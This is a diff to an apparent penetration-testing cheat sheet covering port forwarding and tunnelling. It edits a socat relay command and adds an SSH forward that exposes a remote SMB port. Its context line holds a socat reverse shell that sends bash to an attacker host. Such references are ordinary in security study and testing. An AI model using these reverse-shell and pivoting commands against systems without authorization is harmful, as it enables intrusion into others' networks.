@@ -884,7 +884,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
 
 ```c
 socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
-socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
+socat tcp-listen:9002,reuseaddr,fork tcp:<RHOST>:5968 &
 ```
 
 #### SSH
@@ -899,6 +899,8 @@ ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>
 ssh -L 80:<LHOST>:80 <RHOST>
 ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
 ssh -L 80:localhost:80 <RHOST>
+
+ssh -N -L 0.0.0.0:4455:<RHOST>:445 <USERNAME>@<RHOST>
 ```
 
 #### Time and Date
